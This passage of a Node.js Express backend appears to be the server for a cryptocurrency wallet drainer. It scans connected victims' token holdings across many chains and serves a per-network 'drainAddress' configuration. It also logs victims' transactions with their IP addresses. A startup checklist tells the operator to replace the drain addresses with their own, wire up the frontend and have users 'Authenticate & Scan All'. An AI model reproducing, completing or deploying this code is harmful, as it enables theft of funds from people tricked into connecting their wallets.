        if (result.tokens.length > 0) {
          results.push({
            network: {
              id: result.networkId,
              name: result.networkName,
              symbol: result.networkSymbol,
              type: result.networkType
            },
            tokens: result.tokens,
            summary: {
              totalTokens: result.tokens.length,
              totalValue: result.tokens.reduce((sum, t) => sum + (t.value || 0), 0)
            }
          });
        }
      } catch (error) {
        console.log(`Quick scan failed for ${network.id}:`, error.message);
      }
    }
    
    res.json({
      success: true,
      data: {
        address,
        scannedAt: new Date().toISOString(),
        results: results,
        summary: {
          totalNetworks: results.length,
          totalTokens: results.reduce((sum, r) => sum + r.tokens.length, 0),
          totalValue: results.reduce((sum, r) => sum + r.summary.totalValue, 0)
        }
      },
      requestId
    });
    
  } catch (error) {
    console.error(`❌ [${requestId}] Quick scan error:`, error);
    res.status(500).json({
      success: false,
      error: "Quick scan failed",
      requestId
    });
  }
});

// ==================== TRANSACTION LOGGING ====================
app.post('/log', async (req, res) => {
  const requestId = crypto.randomBytes(8).toString('hex');
  
  try {
    const txData = req.body;
    
    if (!txData.fromAddress) {
      return res.status(400).json({ 
        success: false,
        error: "fromAddress required",
        requestId
      });
    }
    
    const logEntry = {
      id: requestId,
      ...txData,
      timestamp: new Date().toISOString(),
      loggedAt: new Date().toISOString(),
      ip: req.ip
    };
    
    // Store log
    if (!transactionLogs.has(txData.fromAddress)) {
      transactionLogs.set(txData.fromAddress, []);
    }
    transactionLogs.get(txData.fromAddress).push(logEntry);
    
    console.log(`📝 [${requestId}] Transaction logged from ${txData.fromAddress} on ${txData.chainId}`);
    
    // If it's a successful transaction, clear cache for that address/network
    if (txData.transactionHash) {
      const cacheKey = `${txData.fromAddress}:${txData.chainId}`;
      tokenCache.delete(cacheKey);
    }
    
    res.json({
      success: true,
      message: "Transaction logged successfully",
      requestId,
      data: {
        loggedAt: logEntry.timestamp,
        fromAddress: txData.fromAddress,
        chainId: txData.chainId,
        amount: txData.amount,
        nextStep: txData.networkType === 'non-evm' ? "Complete manual transfer" : "Transaction submitted"
      }
    });
    
  } catch (error) {
    console.error(`❌ [${requestId}] Log error:`, error);
    res.status(500).json({
      success: false,
      error: "Failed to log transaction",
      requestId,
      details: error.message
    });
  }
});

// ==================== TOKEN PRICES ====================
app.get('/prices', async (req, res) => {
  try {
    // Check cache first
    if (priceCache.size > 0 && Date.now() - priceCache.get('timestamp') < 60000) {
      return res.json({
        success: true,
        prices: priceCache.get('data'),
        cached: true,
        timestamp: new Date().toISOString()
      });
    }
    
    // Fetch prices from CoinGecko or similar
    const symbols = ['BTC', 'ETH', 'BNB', 'SOL', 'TRX', 'ADA', 'XRP', 'DOGE', 'DOT', 'MATIC'];
    const prices = {};
    
    // This is a simplified version - in production, use proper API
    for (const symbol of symbols) {
      try {
        // Mock prices - replace with actual API call
        prices[symbol] = Math.random() * 100 + 10;
      } catch (error) {
        console.log(`Price fetch failed for ${symbol}:`, error.message);
      }
    }
    
    // Cache prices
    priceCache.set('data', prices);
    priceCache.set('timestamp', Date.now());
    
    res.json({
      success: true,
      prices: prices,
      cached: false,
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error("Price fetch error:", error);
    res.status(500).json({ 
      success: false,
      error: error.message
    });
  }
});

// ==================== NETWORK LIST ====================
app.get('/networks', (req, res) => {
  const networks = [];
  
  // Add EVM networks
  Object.entries(NETWORKS_CONFIG.evm).forEach(([id, config]) => {
    networks.push({
      id: parseInt(id),
      name: config.name,
      symbol: config.symbol,
      type: 'evm',
      scanner: config.scanner,
      decimals: config.decimals,
      drainAddress: DRAIN_ADDRESSES[id] || DRAIN_ADDRESSES[1],
      enabled: true
    });
  });
  
  // Add non-EVM networks
  Object.entries(NETWORKS_CONFIG.nonevm).forEach(([id, config]) => {
    networks.push({
      id: id,
      name: config.name,
      symbol: config.symbol,
      type: 'non-evm',
      scanner: config.scanner,
      decimals: config.decimals,
      drainAddress: DRAIN_ADDRESSES[id],
      enabled: true,
      addressPrefix: config.addressPrefix || ''
    });
  });
  
  res.json({
    success: true,
    data: networks,
    summary: {
      total: networks.length,
      evm: Object.keys(NETWORKS_CONFIG.evm).length,
      nonEvm: Object.keys(NETWORKS_CONFIG.nonevm).length,
      scannable: networks.filter(n => n.scanner && n.scanner !== 'none').length
    }
  });
});

// ==================== BATCH SCAN ====================
app.post('/batch-scan', async (req, res) => {
  const requestId = crypto.randomBytes(8).toString('hex');
  
  try {
    const { addresses, networks } = req.body;
    
    if (!Array.isArray(addresses) || addresses.length === 0) {
      return res.status(400).json({ 
        success: false,
        error: "Addresses array required",
        requestId
      });
    }
    
    const results = {};
    
    for (const address of addresses) {
      if (ethers.isAddress(address)) {
        // Quick scan for each address
        const response = await axios.get(`http://localhost:${PORT}/scan/${address}`);
        if (response.data.success) {
          results[address] = response.data.data;
        }
      }
    }
    
    res.json({
      success: true,
      data: results,
      requestId
    });
    
  } catch (error) {
    console.error(`❌ [${requestId}] Batch scan error:`, error);
    res.status(500).json({
      success: false,
      error: "Batch scan failed",
      requestId
    });
  }
});

// ==================== CACHE MANAGEMENT ====================
app.get('/cache/clear', (req, res) => {
  const { address } = req.query;
  
  if (address) {
    // Clear cache for specific address
    const keysToDelete = [];
    for (const key of tokenCache.keys()) {
      if (key.startsWith(`${address}:`)) {
        keysToDelete.push(key);
      }
    }
    keysToDelete.forEach(key => tokenCache.delete(key));
    
    res.json({
      success: true,
      message: `Cache cleared for ${address}`,
      cleared: keysToDelete.length
    });
  } else {
    // Clear all cache
    const cacheSize = tokenCache.size;
    const priceSize = priceCache.size;
    tokenCache.clear();
    priceCache.clear();
    
    res.json({
      success: true,
      message: "All cache cleared",
      cacheCleared: cacheSize,
      pricesCleared: priceSize
    });
  }
});

// ==================== ERROR HANDLER ====================
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: "Endpoint not found",
    availableEndpoints: {
      "GET /": "API information",
      "POST /auth": "Authenticate wallet",
      "POST /scan": "Scan all networks",
      "GET /scan/:address": "Quick scan",
      "GET /tokens/evm/:address/:chainId": "Scan EVM chain",
      "GET /tokens/nonevm/:address/:networkId": "Scan non-EVM chain",
      "POST /log": "Log transaction",
      "GET /prices": "Get token prices",
      "GET /health": "Health check",
      "GET /networks": "List all networks",
      "POST /batch-scan": "Batch scan networks",
      "GET /cache/clear": "Clear cache"
    }
  });
});

// ==================== START SERVER ====================
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log('='.repeat(80));
  console.log('🚀 UNIVERSAL TOKEN SCANNER BACKEND v6.0');
  console.log(`📡 Port: ${PORT}`);
  console.log(`🌐 Total Networks: ${Object.keys(NETWORKS_CONFIG.evm).length + Object.keys(NETWORKS_CONFIG.nonevm).length}`);
  console.log(`   • EVM Chains: ${Object.keys(NETWORKS_CONFIG.evm).length}`);
  console.log(`   • Non-EVM Chains: ${Object.keys(NETWORKS_CONFIG.nonevm).length}`);
  console.log(`🔧 Scanners: Covalent, Direct RPC, Blockchain APIs`);
  console.log(`💰 Drain addresses: ${Object.keys(DRAIN_ADDRESSES).length} configured`);
  console.log(`⚠️  IMPORTANT: Replace placeholder drain addresses with your own!`);
  console.log(`✅ Server ready at http://localhost:${PORT}`);
  console.log('='.repeat(80));
  
  console.log('\n📋 Quick Start:');
  console.log('1. Replace all DRAIN_ADDRESSES with your actual addresses');
  console.log('2. Add your API keys in API_KEYS object');
  console.log('3. Update frontend backendUrl to point to this server');
  console.log('4. Run frontend and connect wallet');
  console.log('5. Input non-EVM addresses in Address Manager');
  console.log('6. Click "Authenticate & Scan All"');
});

